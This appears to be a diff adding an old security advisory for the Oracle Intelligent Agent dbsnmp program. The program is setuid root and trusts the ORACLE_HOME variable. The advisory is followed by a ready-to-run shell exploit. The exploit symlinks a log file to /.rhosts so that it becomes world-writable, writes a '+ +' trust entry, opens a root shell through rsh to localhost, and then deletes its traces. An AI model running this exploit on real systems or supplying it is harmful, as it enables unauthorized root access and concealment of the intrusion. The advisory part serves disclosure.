@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/585/info
+
+A vulnerability in the Oracle Intelligent Agent allows local malicious users to execute arbitrary commands and to create world writable files as the root user.
+
+The problem lies in the dbsnmp program located in $ORACLE_HOME/bin . This setuid root and setgid dba program trusts the environment variable ORACLE_HOME without verifying its contents. This vulnerability can be exploited in a number of ways.
+
+The dbsnmp program calls a tcl script ( nmiconf.tcl ) located by default in $ORACLE_HOME/network/agent/config. A malicious user can craft his own nmiconf.tcl script and fool the dbsnmp program to execute as root.
+
+When run without ORACLE_HOME being set, dbsnmp will dump two log files out into the current working directory: dbsnmpc and dbsnmpt . If these files do not exist, dbsnmp will attempt to create them mode 666 and dump around 400 bytes of uncontrollable output into them. If the files do exist, dbsnmp will append these 400 bytes but not change the permissions. Thus a malicious user can create world writable files in the system that do not exist (e.g. /.rhosts).
+
+
+#!/bin/sh
+# Exploit for Oracle 8.1.5 on Solaris 2.6 and probably others
+# You'll probably have to change your path to dbsnmp
+# Exploit will only work if /.rhosts does NOT exist
+#
+# Brock Tellier btellier@usa.net
+cd /tmp
+unset ORACLE_HOME
+umask 0000
+ln -s /.rhosts /tmp/dbsnmpc.log
+/u01/app/oracle/product/8.1.5/bin/dbsnmp
+echo "+ +" > /.rhosts
+rsh -l root localhost 'sh -i'
+rsh -l root localhost rm /tmp/*log*
+rsh -l root localhost rm /.rhosts
